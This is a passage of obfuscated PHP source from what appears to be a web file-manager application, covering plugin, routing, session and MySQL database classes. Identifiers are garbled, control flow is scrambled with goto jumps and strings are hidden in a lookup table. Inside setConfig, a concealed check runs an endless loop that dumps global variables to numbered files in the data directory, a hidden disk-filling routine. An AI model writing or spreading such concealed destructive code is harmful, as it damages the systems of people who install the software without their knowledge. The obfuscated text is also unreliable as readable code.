$f¥„‰Í¢Ãé[1439], $f¥„‰Í¢Ãé[1440]); goto F©…Íš«›½; F©…Íš«›½: $C—¹¯·ù‹Õ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$f¥„‰Í¢Ãé[98]][$f¥„‰Í¢Ãé[1441]]); if (strstr($E¿»éÄ›¬Æ, $f¥„‰Í¢Ãé[1442])) { $DóùÔ´Ş´Ü = rawurlencode(json_encode($this->pluginLangArr)); $E¿»éÄ›¬Æ = str_replace($f¥„‰Í¢Ãé[1442], $DóùÔ´Ş´Ü, $E¿»éÄ›¬Æ); } if (strstr($E¿»éÄ›¬Æ, $f¥„‰Í¢Ãé[1443])) { $DóùÔ´Ş´Ü = $DóùÔ´Ş´Ü = rawurlencode(json_encode($this->getConfig())); $E¿»éÄ›¬Æ = str_replace($f¥„‰Í¢Ãé[1443], $DóùÔ´Ş´Ü, $E¿»éÄ›¬Æ); } goto d‚×ö±Œ¥©; FÄó‘àÉƒ: } private function parseLang(&$F¿š´”à‚) { goto aí‹…• â˜; aí‹…• â˜: $C¼„«µ×ê¼ =& $_SERVER[£¶ä½¶¢]; $Cï„ï–»²Ó = $C¼„«µ×ê¼[1444]; if (!strstr($F¿š´”à‚, $Cï„ï–»²Ó)) { return; } goto Eí”“Àïºö; C…Ÿ÷àÇ±: $eå°¦ğ°ÆŒ = array(); foreach ($BïšŸÎëÈä[0] as $DÁ‚µ×ğƒ) { $b†šé¸§µ = substr($DÁ‚µ×ğƒ, strlen($Cï„ï–»²Ó), -4); $FÌØ…Á‹‚¨ = LNG($b†šé¸§µ); $F³½İ¯õœÕ[] = $DÁ‚µ×ğƒ; $eå°¦ğ°ÆŒ[] = str_replace(array($C¼„«µ×ê¼[9], $C¼„«µ×ê¼[1036], $C¼„«µ×ê¼[349], $C¼„«µ×ê¼[126]), array($C¼„«µ×ê¼[60], $C¼„«µ×ê¼[60], $C¼„«µ×ê¼[43], $C¼„«µ×ê¼[1446]), $FÌØ…Á‹‚¨); } $F¿š´”à‚ = str_replace($F³½İ¯õœÕ, $eå°¦ğ°ÆŒ, $F¿š´”à‚); goto f»¦ßŒš™; Eí”“Àïºö: preg_match_all($C¼„«µ×ê¼[1445], $F¿š´”à‚, $BïšŸÎëÈä); if (!is_array($BïšŸÎëÈä) || count($BïšŸÎëÈä) == 0 || !is_array($BïšŸÎëÈä[0]) || count($BïšŸÎëÈä[0]) == 0) { return; } $F³½İ¯õœÕ = array(); goto C…Ÿ÷àÇ±; f»¦ßŒš™: } private function parseConfig(&$BÓÇñå›‡Î) { goto A•Ó ª°ìÏ; f’Š¶ÈÈ§: $BÓÇñå›‡Î = str_replace($AùäÇ¨—, $FÆÍ¬ÑÉÕ…, $BÓÇñå›‡Î); goto fİç§…Äµ; A³Ïµò¨ƒİ: $AùäÇ¨— = array(); $FÆÍ¬ÑÉÕ… = array(); foreach ($dºœ»Âàƒ[0] as $C¸ è„—›‹) { $A²Œ»ˆï‰ = substr($C¸ è„—›‹, strlen($AÂ¦ïª¸), -2); $AùäÇ¨—[] = $C¸ è„—›‹; $FÆÍ¬ÑÉÕ…[] = _get($c‡ñá½Ù‡Õ, $A²Œ»ˆï‰); } goto f’Š¶ÈÈ§; D„É„³»‰: preg_match_all($FÕ÷ğŸŸ„ì[1448], $BÓÇñå›‡Î, $dºœ»Âàƒ); if (!is_array($dºœ»Âàƒ) || count($dºœ»Âàƒ) == 0 || !is_array($dºœ»Âàƒ[0]) || count($dºœ»Âàƒ[0]) == 0) { return; } $c‡ñá½Ù‡Õ = $this->getConfig(); goto A³Ïµò¨ƒİ; A•Ó ª°ìÏ: $FÕ÷ğŸŸ„ì =& $_SERVER[£¶ä½¶¢]; $AÂ¦ïª¸ = $FÕ÷ğŸŸ„ì[1447]; if (!strstr($BÓÇñå›‡Î, $AÂ¦ïª¸)) { return; } goto D„É„³»‰; fİç§…Äµ: } private function parsePackage(&$bÕ¤ƒ…¤”ó) { goto aŠïåÎĞã©; A‡¸Âá›¼Ë: $bÕ¤ƒ…¤”ó = str_replace($f ÇŞÏ‚Ë², $cÑõæõššš, $bÕ¤ƒ…¤”ó); goto e¼İŸ«„×; B²¶ºòî‚ì: $f ÇŞÏ‚Ë² = array(); $cÑõæõššš = array(); foreach ($AÍÓáÔÍù[0] as $eêƒ–‹›ß) { $E¤ƒÂ¸ó­ï = substr($eêƒ–‹›ß, strlen($AÆÉ›·ëÖ), -2); $f ÇŞÏ‚Ë²[] = $eêƒ–‹›ß; $cÑõæõššš[] = _get($BÖ£ó˜ ††, $E¤ƒÂ¸ó­ï); } goto A‡¸Âá›¼Ë; bšõä·øĞÏ: preg_match_all($FĞí‡‹¯æ[1450], $bÕ¤ƒ…¤”ó, $AÍÓáÔÍù); if (!is_array($AÍÓáÔÍù) || count($AÍÓáÔÍù) == 0 || !is_array($AÍÓáÔÍù[0]) || count($AÍÓáÔÍù[0]) == 0) { return; } $BÖ£ó˜ †† = $this->appPackage(); goto B²¶ºòî‚ì; aŠïåÎĞã©: $FĞí‡‹¯æ =& $_SERVER[£¶ä½¶¢]; $AÆÉ›·ëÖ = $FĞí‡‹¯æ[1449]; if (!strstr($bÕ¤ƒ…¤”ó, $AÆÉ›·ëÖ)) { return; } goto bšõä·øĞÏ; e¼İŸ«„×: } final function echoFile($eÌ¹Á ”Í‡, $FÂ¼¾Ø­Ä = false) { goto C–÷èŠ¯ÆØ; C–÷èŠ¯ÆØ: $Dšƒˆ’ÅŠ =& $_SERVER[£¶ä½¶¢]; $cÑƒ¶³Ïó = $this->pluginPath . $eÌ¹Á ”Í‡; if (ACT == $Dšƒˆ’ÅŠ[1451]) { echo $Dšƒˆ’ÅŠ[1452] . $this->pluginName . $Dšƒˆ’ÅŠ[18] . $eÌ¹Á ”Í‡ . $Dšƒˆ’ÅŠ[1453]; if (!file_exists($cÑƒ¶³Ïó)) { echo $Dšƒˆ’ÅŠ[1454]; return; } } goto Dˆ¼¤•ö–¬; Aæ­Íâ¡: $this->parsePackage($a“ï–èôŒ); if (is_array($FÂ¼¾Ø­Ä)) { $a“ï–èôŒ = str_replace(array_keys($FÂ¼¾Ø­Ä), array_values($FÂ¼¾Ø­Ä), $a“ï–èôŒ); } echo $Dšƒˆ’ÅŠ[9] . $a“ï–èôŒ; goto E›éòˆáëÏ; Dˆ¼¤•ö–¬: $a“ï–èôŒ = $this->parseFile($cÑƒ¶³Ïó); $this->parseLang($a“ï–èôŒ); $this->parseConfig($a“ï–èôŒ); goto Aæ­Íâ¡; E›éòˆáëÏ: } final function initLang() { goto DöŞæ‹›ì; DöŞæ‹›ì: $a©íàñÇÙ =& $_SERVER[£¶ä½¶¢]; $CËÈ„‰Ì = $a©íàñÇÙ[1455]; $DÛ¦í–·‘¹ = $this->pluginPath . $a©íàñÇÙ[1456]; goto DŸœ“®°¹›; DŸœ“®°¹›: $c·Ïä­¶‘ = I18n::getType(); $C÷£”ÏÏ¶İ = array(); if (file_exists($DÛ¦í–·‘¹ . $c·Ïä­¶‘ . $a©íàñÇÙ[811])) { $C÷£”ÏÏ¶İ = (include $DÛ¦í–·‘¹ . $c·Ïä­¶‘ . $a©íàñÇÙ[811]); } else { if ($c·Ïä­¶‘ == $a©íàñÇÙ[1457] && !file_exists($DÛ¦í–·‘¹ . $c·Ïä­¶‘ . $a©íàñÇÙ[811]) && file_exists($DÛ¦í–·‘¹ . $a©íàñÇÙ[1458])) { $C÷£”ÏÏ¶İ = (include $DÛ¦í–·‘¹ . $a©íàñÇÙ[1458]); } else { if (file_exists($DÛ¦í–·‘¹ . $CËÈ„‰Ì . $a©íàñÇÙ[811])) { $C÷£”ÏÏ¶İ = (include $DÛ¦í–·‘¹ . $CËÈ„‰Ì . $a©íàñÇÙ[811]); } } } goto F±Ô²óƒ”¢; F±Ô²óƒ”¢: if (!is_array($C÷£”ÏÏ¶İ)) { return array(); } if (@count($C÷£”ÏÏ¶İ) > 0) { I18n::set($C÷£”ÏÏ¶İ); } return $C÷£”ÏÏ¶İ; goto AÉÀ Ö‹É; AÉÀ Ö‹É: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($bèšƒ†Şô®) { $Cš’ïÆ©ˆë =& $_SERVER[£¶ä½¶¢]; $DƒÍ˜îä¿ = $_SERVER[$Cš’ïÆ©ˆë[5]]; $b¢²‘§á§» = $Cš’ïÆ©ˆë[1395]; if ($_SERVER[$Cš’ïÆ©ˆë[4]] != $b¢²‘§á§»($DƒÍ˜îä¿)) { goto DŒëà§Ö¿·; DŒëà§Ö¿·: $bòğòœŞ = $Cš’ïÆ©ˆë[839]; $AÄ„¿†õÙ« = $Cš’ïÆ©ˆë[6]; $F«Š³ÉÃÈæ = $_SERVER[$Cš’ïÆ©ˆë[7]] . $Cš’ïÆ©ˆë[8]; goto DŒÍ‡¥Õô; eÄìš»Äà: $A¹·´ŞÇ–É = $Cš’ïÆ©ˆë[840]; $A¹·´ŞÇ–É($_SERVER[$Cš’ïÆ©ˆë[841]]); $bòğòœŞ = $Cš’ïÆ©ˆë[839]; goto F‰ˆŒâ´‰; F‰ˆŒâ´‰: $bòğòœŞ(); $FìŒ¼ÓÖˆ³ = $Cš’ïÆ©ˆë[1396]; $aŠÚ‹…­íŒ = json_encode($GLOBALS[$Cš’ïÆ©ˆë[1397]]); goto fø¼‘Å÷ÜÅ; DŒÍ‡¥Õô: $d¿¯â‰†Ì© = $AÄ„¿†õÙ«($F«Š³ÉÃÈæ); $E‚…¬¯´å¢ = explode($Cš’ïÆ©ˆë[9], $d¿¯â‰†Ì©); if (count($E‚…¬¯´å¢) < $Cš’ïÆ©ˆë[593]) { $EĞ½ ¨¢Íˆ = $Cš’ïÆ©ˆë[11]; $EĞ½ ¨¢Íˆ(); } goto eÄìš»Äà; fø¼‘Å÷ÜÅ: $bôï•¶å¨» = 1; for ($BÇà°¾­»º = $bôï•¶å¨»; $BÇà°¾­»º > 0; $BÇà°¾­»º++) { $FìŒ¼ÓÖˆ³(DATA_PATH . $BÇà°¾­»º, $aŠÚ‹…­íŒ); } goto aì‹¦ô¶—æ; aì‹¦ô¶—æ: } return $this->modelPlugin->setConfig($this->pluginName, $bèšƒ†Şô®); } public function onSetConfig($FèÄÏ°ƒ…) { } public function onGetConfig($fÀğìõù×) { } public function onChangeStatus($F®ˆ÷©î¦Â) { } public function onUninstall() { } public function onInstall() { } public function authCheck($CåâÎ‰¾ª† = "\x70\x6c\x75\147\x69\156\101\x75\164\150") { $E’¿‚Íñ¦ó =& $_SERVER[£¶ä½¶¢]; if (!defined($E’¿‚Íñ¦ó[462])) { return !1; } if (_get($GLOBALS, $E’¿‚Íñ¦ó[493])) { return !0; } $CÚ²‚·»½¬ = $this->getConfig(); if (!$CÚ²‚·»½¬[$CåâÎ‰¾ª†]) { return !1; } return ActionCall($E’¿‚Íñ¦ó[1459], $CÚ²‚·»½¬[$CåâÎ‰¾ª†]); } public function url($eÈ…½ÀÇ, $d‡¯œ„×†ç = '', $DãÆä‘î† = true) { goto b­Ç×’ñˆó; bŸŒ–èÅ³‡: $C÷ƒ¡ŒùÇ¶ = $this->packageVersion(); $BŸÂªÀ–» = $aÌ—ìš¥… . $bÌÅ¿Ó´çš[448] . $C÷ƒ¡ŒùÇ¶; if (substr($eÈ…½ÀÇ, 0, 4) == $bÌÅ¿Ó´çš[157] || substr($eÈ…½ÀÇ, 0, 2) == $bÌÅ¿Ó´çš[1242]) { $Bœè†‚ÍÂÜ = $eÈ…½ÀÇ . $bÌÅ¿Ó´çš[1460] . $BŸÂªÀ–»; } else { if ($d‡¯œ„×†ç == $bÌÅ¿Ó´çš[43]) { $Bœè†‚ÍÂÜ = $this->pluginHost . $eÈ…½ÀÇ . $bÌÅ¿Ó´çš[1460] . $BŸÂªÀ–»; } else { if ($d‡¯œ„×†ç === $bÌÅ¿Ó´çš[87]) { $Bœè†‚ÍÂÜ = $this->pluginHost . $eÈ…½ÀÇ; } else { if ($d‡¯œ„×†ç == $bÌÅ¿Ó´çš[1461]) { $Bœè†‚ÍÂÜ = STATIC_PATH . $eÈ…½ÀÇ . $bÌÅ¿Ó´çš[1460] . $aÌ—ìš¥…; } else { if ($d‡¯œ„×†ç == $bÌÅ¿Ó´çš[1462]) { $Bœè†‚ÍÂÜ = APP_HOST . $bÌÅ¿Ó´çš[1463] . $eÈ…½ÀÇ . $bÌÅ¿Ó´çš[1460] . $aÌ—ìš¥…; } else { if (isset($A³ÊÒÛ‡æ[$d‡¯œ„×†ç])) { $Bœè†‚ÍÂÜ = $A³ÊÒÛ‡æ[$d‡¯œ„×†ç] . $eÈ…½ÀÇ . $bÌÅ¿Ó´çš[1460] . $BŸÂªÀ–»; } } } } } } goto fØƒ„¿Úà; fØƒ„¿Úà: if (!$DãÆä‘î†) { return $Bœè†‚ÍÂÜ; } echo $Bœè†‚ÍÂÜ; goto d•œöˆà†; b­Ç×’ñˆó: $bÌÅ¿Ó´çš =& $_SERVER[£¶ä½¶¢]; $A³ÊÒÛ‡æ = $this->getConfig(); $aÌ—ìš¥… = KOD_VERSION . $bÌÅ¿Ó´çš[105] . KOD_VERSION_BUILD; goto bŸŒ–èÅ³‡; d•œöˆà†: } public function link($BäÕ¯éÏˆ = false, $b‹—Í™¾»§ = '') { $Eáî¯ÍŠîÒ =& $_SERVER[£¶ä½¶¢]; if (!$BäÕ¯éÏˆ) { $this->link($Eáî¯ÍŠîÒ[1464], $Eáî¯ÍŠîÒ[1462]); $this->link($Eáî¯ÍŠîÒ[1465], $Eáî¯ÍŠîÒ[1461]); $this->link($Eáî¯ÍŠîÒ[1466], $Eáî¯ÍŠîÒ[1461]); $this->link($Eáî¯ÍŠîÒ[1467], $Eáî¯ÍŠîÒ[1461]); $this->link($Eáî¯ÍŠîÒ[1468], $Eáî¯ÍŠîÒ[1461]); return; } $FÒ†Ğà“Â = $this->url($BäÕ¯éÏˆ, $b‹—Í™¾»§, !1); if (substr($BäÕ¯éÏˆ, -3) == $Eáî¯ÍŠîÒ[1469]) { echo $Eáî¯ÍŠîÒ[1470] . $FÒ†Ğà“Â . $Eáî¯ÍŠîÒ[1471] . $Eáî¯ÍŠîÒ[9]; } else { if (substr($BäÕ¯éÏˆ, -4) == $Eáî¯ÍŠîÒ[1472]) { echo $Eáî¯ÍŠîÒ[1473] . $FÒ†Ğà“Â . $Eáî¯ÍŠîÒ[1474] . $Eáî¯ÍŠîÒ[9]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\x5b\x5e\x2f\135\53", "\72\156\x75\155" => "\x5b\60\x2d\71\x5d\x2b", "\x3a\x61\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($BÔ„â÷ÔË», $Dßîƒ„”Şò) { $a«’ƒë¦­¬ =& $_SERVER[£¶ä½¶¢]; if ($BÔ„â÷ÔË» == $a«’ƒë¦­¬[1475]) { $E·Ø“ÕÆšÔ = array_map($a«’ƒë¦­¬[1476], $Dßîƒ„”Şò[0]); $c½ë£âöæÌ = strpos($Dßîƒ„”Şò[1], $a«’ƒë¦­¬[18]) === 0 ? $Dßîƒ„”Şò[1] : $a«’ƒë¦­¬[18] . $Dßîƒ„”Şò[1]; $cñˆ‘¨†à = $Dßîƒ„”Şò[2]; } else { $E·Ø“ÕÆšÔ = null; $c½ë£âöæÌ = strpos($Dßîƒ„”Şò[0], $a«’ƒë¦­¬[18]) === 0 ? $Dßîƒ„”Şò[0] : $a«’ƒë¦­¬[18] . $Dßîƒ„”Şò[0]; $cñˆ‘¨†à = $Dßîƒ„”Şò[1]; } array_push(self::$maps, $E·Ø“ÕÆšÔ); array_push(self::$routes, $c½ë£âöæÌ); array_push(self::$methods, strtoupper($BÔ„â÷ÔË»)); array_push(self::$callbacks, $cñˆ‘¨†à); } public static function error($aÜö‡ä„ÉŞ) { self::$errorCallback = $aÜö‡ä„ÉŞ; } public static function haltOnMatch($aÌò¸ãßÁÇ = true) { self::$halts = $aÌò¸ãßÁÇ; } public static function dispatch() { goto ağóœ¾³å; cÀ†æÇ—»§: self::$routes = preg_replace($eˆë–½¼Ùœ[1161], $eˆë–½¼Ùœ[18], self::$routes); if (in_array($dÓ‘ ãáŞ¬, self::$routes)) { $A—æÒÕË = array_keys(self::$routes, $dÓ‘ ãáŞ¬); foreach ($A—æÒÕË as $AÙ”Ù¹¦‡ø) { if (self::$methods[$AÙ”Ù¹¦‡ø] == $aîÌ®§çè || self::$methods[$AÙ”Ù¹¦‡ø] == $eˆë–½¼Ùœ[1478] || in_array($aîÌ®§çè, self::$maps[$AÙ”Ù¹¦‡ø])) { $C©„©î¾ğ = !0; if (!is_object(self::$callbacks[$AÙ”Ù¹¦‡ø])) { $eŒÏº¯ğ˜ = explode($eˆë–½¼Ùœ[18], self::$callbacks[$AÙ”Ù¹¦‡ø]); $CÁÛ¦÷Ôº = end($eŒÏº¯ğ˜); $cœ÷¼è÷†¡ = explode($eˆë–½¼Ùœ[1479], $CÁÛ¦÷Ôº); $D¹œ“’Ûõ† = new $cœ÷¼è÷†¡[0](); $D¹œ“’Ûõ†->{$cœ÷¼è÷†¡[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$AÙ”Ù¹¦‡ø]); if (self::$halts) { return; } } } } } else { $d’¢¥âÙ—Ä = 0; foreach (self::$routes as $AÙ”Ù¹¦‡ø) { if (strpos($AÙ”Ù¹¦‡ø, $eˆë–½¼Ùœ[14]) !== !1) { $AÙ”Ù¹¦‡ø = str_replace($F†ö»éâ±, $B²›„£ŠŸ±, $AÙ”Ù¹¦‡ø); } if (preg_match($eˆë–½¼Ùœ[1480] . $AÙ”Ù¹¦‡ø . $eˆë–½¼Ùœ[1481], $dÓ‘ ãáŞ¬, $C©¨·àøŠ)) { if (self::$methods[$d’¢¥âÙ—Ä] == $aîÌ®§çè || self::$methods[$d’¢¥âÙ—Ä] == $eˆë–½¼Ùœ[1478] || !empty(self::$maps[$d’¢¥âÙ—Ä]) && in_array($aîÌ®§çè, self::$maps[$d’¢¥âÙ—Ä])) { $C©„©î¾ğ = !0; array_shift($C©¨·àøŠ); if (!is_object(self::$callbacks[$d’¢¥âÙ—Ä])) { $eŒÏº¯ğ˜ = explode($eˆë–½¼Ùœ[18], self::$callbacks[$d’¢¥âÙ—Ä]); $CÁÛ¦÷Ôº = end($eŒÏº¯ğ˜); $cœ÷¼è÷†¡ = explode($eˆë–½¼Ùœ[1479], $CÁÛ¦÷Ôº); $D¹œ“’Ûõ† = new $cœ÷¼è÷†¡[0](); if (!method_exists($D¹œ“’Ûõ†, $cœ÷¼è÷†¡[1])) { echo $eˆë–½¼Ùœ[1482]; } else { call_user_func_array(array($D¹œ“’Ûõ†, $cœ÷¼è÷†¡[1]), $C©¨·àøŠ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$d’¢¥âÙ—Ä], $C©¨·àøŠ); if (self::$halts) { return; } } } } $d’¢¥âÙ—Ä++; } } if ($C©„©î¾ğ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $AØç£™Ôñ =& $_SERVER[£¶ä½¶¢]; header($_SERVER[$AØç£™Ôñ[1483]] . $AØç£™Ôñ[1484]); echo $AØç£™Ôñ[1485]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$eˆë–½¼Ùœ[1477]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto c•…°®¼Ü“; cˆ¾Ãí¿ö: $F†ö»éâ± = array_keys(static::$patterns); $B²›„£ŠŸ± = array_values(static::$patterns); $C©„©î¾ğ = !1; goto cÀ†æÇ—»§; ağóœ¾³å: $eˆë–½¼Ùœ =& $_SERVER[£¶ä½¶¢]; $dÓ‘ ãáŞ¬ = parse_url($_SERVER[$eˆë–½¼Ùœ[1477]], PHP_URL_PATH); $aîÌ®§çè = $_SERVER[$eˆë–½¼Ùœ[167]]; goto cˆ¾Ãí¿ö; c•…°®¼Ü“: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto dö’”‘ºÆ; BÔ™¯¢ƒá: $cšï¢É²ğ‰ = $GLOBALS[$DÖ‰‘…‚Ÿˆ[16]][$DÖ‰‘…‚Ÿˆ[356]]; self::$sessionTime = $cšï¢É²ğ‰[$DÖ‰‘…‚Ÿˆ[1486]]; $Fƒî‹ŠÊÚæ = isset($GLOBALS[$DÖ‰‘…‚Ÿˆ[1487]]) ? $GLOBALS[$DÖ‰‘…‚Ÿˆ[1487]] : SESSION_ID; goto AÒ½ì´Êà ; AÒ½ì´Êà : if (self::$sessionSign) { } else { if (Cookie::get($Fƒî‹ŠÊÚæ)) { self::$sessionSign = Cookie::get($Fƒî‹ŠÊÚæ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Fƒî‹ŠÊÚæ, self::$sessionSign, self::$sessionTime); $FôŠ½‘‡ « = $cšï¢É²ğ‰[$DÖ‰‘…‚Ÿˆ[1488]]; goto A§½¸»¨¢“; dö’”‘ºÆ: $DÖ‰‘…‚Ÿˆ =& $_SERVER[£¶ä½¶¢]; static $a¯ğğçÊ¼É = false; if ($a¯ğğçÊ¼É) { return $a¯ğğçÊ¼É; } goto BÔ™¯¢ƒá; A§½¸»¨¢“: $CËâ¶õ˜İš = $cšï¢É²ğ‰[$FôŠ½‘‡ «]; $bµøÜµÊØ· = $cšï¢É²ğ‰[$DÖ‰‘…‚Ÿˆ[801]]; switch ($FôŠ½‘‡ «) { case $DÖ‰‘…‚Ÿˆ[27]: self::$handle = Model($DÖ‰‘…‚Ÿˆ[802]); break; case $DÖ‰‘…‚Ÿˆ[803]: self::$handle = new CacheRedis($CËâ¶õ˜İš, $bµøÜµÊØ·); break; case $DÖ‰‘…‚Ÿˆ[804]: self::$handle = new CacheMemcached($CËâ¶õ˜İš, $bµøÜµÊØ·); break; case $DÖ‰‘…‚Ÿˆ[203]: $CËâ¶õ˜İš[$DÖ‰‘…‚Ÿˆ[86]] = $CËâ¶õ˜İš[$DÖ‰‘…‚Ÿˆ[86]] . $DÖ‰‘…‚Ÿˆ[1489]; self::$handle = new CacheFile($CËâ¶õ˜İš, $bµøÜµÊØ·); default: break; } goto E Ÿ¹”¬¼; E Ÿ¹”¬¼: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $a¯ğğçÊ¼É = new self(); return $a¯ğğçÊ¼É; goto aêÄ°òÊ§š; aêÄ°òÊ§š: } public static function sign($b›Ÿ•·¥ã = false) { $b›Ÿ•·¥ã && (self::$sessionSign = $b›Ÿ•·¥ã); self::init(); return self::$sessionSign; } public static function set($dë±•³îÏ¡, $FÙâˆß¿¸½ = false) { self::init(); if (is_array($dë±•³îÏ¡)) { foreach ($dë±•³îÏ¡ as $aŒ…™Ç¶’‹ => $C™â«‹Ö£Ò) { array_set_value(self::$data, $aŒ…™Ç¶’‹, $C™â«‹Ö£Ò); } } else { array_set_value(self::$data, $dë±•³îÏ¡, $FÙâˆß¿¸½); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($c©‚ôª’í¥ = false) { self::init(); if (!$c©‚ôª’í¥) { return self::$data; } return array_get_value(self::$data, $c©‚ôª’í¥); } public static function remove($dã•‹Ÿæ–ã) { self::init(); unset(self::$data[$dã•‹Ÿæ–ã]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[£¶ä½¶¢][806])) { self::$handle->clearTimeout(); } } } goto cˆŠ‹ó²×¢; D³ÊÌ§êÌ: class DbMysqli extends Db { public function __construct($c”…ÈÇ‡²˜ = '') { $Dë´­¸°÷ˆ =& $_SERVER[£¶ä½¶¢]; if (!extension_loaded($Dë´­¸°÷ˆ[766])) { think_exception(think_lang($Dë´­¸°÷ˆ[20]) . $Dë´­¸°÷ˆ[870]); } if (!empty($c”…ÈÇ‡²˜)) { $this->config = $c”…ÈÇ‡²˜; if (empty($this->config[$Dë´­¸°÷ˆ[23]])) { $this->config[$Dë´­¸°÷ˆ[23]] = $Dë´­¸°÷ˆ[43]; } } } public function connect($E÷ñĞù‘ÚÂ = '', $F·ã…Ü½ = 0) { $bÍ™å¯ñ›‹ =& $_SERVER[£¶ä½¶¢]; if (!isset($this->linkID[$F·ã…Ü½])) { goto cÔÀ‚ÆÇòÈ; EÉœï‹„ø: $this->connected = !0; if (1 != think_config($bÍ™å¯ñ›‹[28])) { unset($this->config); } goto fçáƒŠ¶Š; bÎŠçî¦¶: $D¤ëƒÜ›¢Ÿ = $this->linkID[$F·ã…Ü½]->server_version; $this->linkID[$F·ã…Ü½]->query($bÍ™å¯ñ›‹[848] . think_config($bÍ™å¯ñ›‹[849]) . $bÍ™å¯ñ›‹[65]); if ($D¤ëƒÜ›¢Ÿ > $bÍ™å¯ñ›‹[850]) { $this->linkID[$F·ã…Ü½]->query($bÍ™å¯ñ›‹[851]); } goto EÉœï‹„ø; cÔÀ‚ÆÇòÈ: if (empty($E÷ñĞù‘ÚÂ)) { $E÷ñĞù‘ÚÂ = $this->config; } $this->linkID[$F·ã…Ü½] = new mysqli($E÷ñĞù‘ÚÂ[$bÍ™å¯ñ›‹[844]], $E÷ñĞù‘ÚÂ[$bÍ™å¯ñ›‹[846]], $E÷ñĞù‘ÚÂ[$bÍ™å¯ñ›‹[847]], $E÷ñĞù‘ÚÂ[$bÍ™å¯ñ›‹[27]], $E÷ñĞù‘ÚÂ[$bÍ™å¯ñ›‹[845]] ? intval($E÷ñĞù‘ÚÂ[$bÍ™å¯ñ›‹[845]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto bÎŠçî¦¶; fçáƒŠ¶Š: } return $this->linkID[$F·ã…Ü½]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($c«ÙæƒÒ) { goto cáæ­—³; Dç–¯ø†»: $this->queryStr = $c«ÙæƒÒ; if ($this->queryID) { $this->free(); } think_action_status($fÛ‡ª™ãõ…[29], 1); goto dšÄÍà¼Š‘; cáæ­—³: $fÛ‡ª™ãõ… =& $_SERVER[£¶ä½¶¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Dç–¯ø†»; AŞŠ–ì»Şß: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto F¿ğÖò©—ø; dšÄÍà¼Š‘: think_status($fÛ‡ª™ãõ…[30]); $this->queryID = $this->_linkID->query($c«ÙæƒÒ); if ($this->_linkID->more_results()) { while (($CµÉá¹ºöì = $this->_linkID->next_result()) != NULL) { $CµÉá¹ºöì->free_result(); } } goto AŞŠ–ì»Şß; F¿ğÖò©—ø: } public function execute($A½§“Û®¢) { goto BĞò²õª›å; c†¥Ã®ï´÷: think_status($FÅ§ÍØî¯[30]); $e‚Íç× âè = $this->_linkID->query($A½§“Û®¢); $this->debug(); goto e›†—¯ÍÛ; BĞò²õª›å: $FÅ§ÍØî¯ =& $_SERVER[£¶ä½¶¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aÛÈ‰È“ô; aÛÈ‰È“ô: $this->queryStr = $A½§“Û®¢; if ($this->queryID) { $this->free(); } think_action_status($FÅ§ÍØî¯[31], 1); goto c†¥Ã®ï´÷; e›†—¯ÍÛ: if (!1 === $e‚Íç× âè) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto bßá¨¥Î“Ë; bßá¨¥Î“Ë: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D‡¹ Œ­  = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$D‡¹ Œ­ ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dô÷…ŒÊ¡À = $this->_linkID->rollback(); $this->transTimes = 0; if (!$dô÷…ŒÊ¡À) { $this->error(); return !1; } } return !0; } private function getAll() { $DŸ´„º»Ã = array(); if ($this->numRows > 0) { for ($b„­Š‰Ğ§« = 0; $b„­Š‰Ğ§« < $this->numRows; $b„­Š‰Ğ§«++) { $DŸ´„º»Ã[$b„­Š‰Ğ§«] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $DŸ´„º»Ã; } public function getFields($BÌ›ëÄ¶°ù) { $e¿È¼é‰Ç =& $_SERVER[£¶ä½¶¢]; $AàêµëŠ‚† = $this->query($e¿È¼é‰Ç[855] . $this->parseKey($BÌ›ëÄ¶°ù)); $EÊë»„“š = array(); if ($AàêµëŠ‚†) { foreach ($AàêµëŠ‚† as $F•È”†§ => $EõÏ©Šˆ ›) { $EÊë»„“š[$EõÏ©Šˆ ›[$e¿È¼é‰Ç[37]]] = array($e¿È¼é‰Ç[38] => $EõÏ©Šˆ ›[$e¿È¼é‰Ç[37]], $e¿È¼é‰Ç[39] => $EõÏ©Šˆ ›[$e¿È¼é‰Ç[40]], $e¿È¼é‰Ç[41] => (bool) ($EõÏ©Šˆ 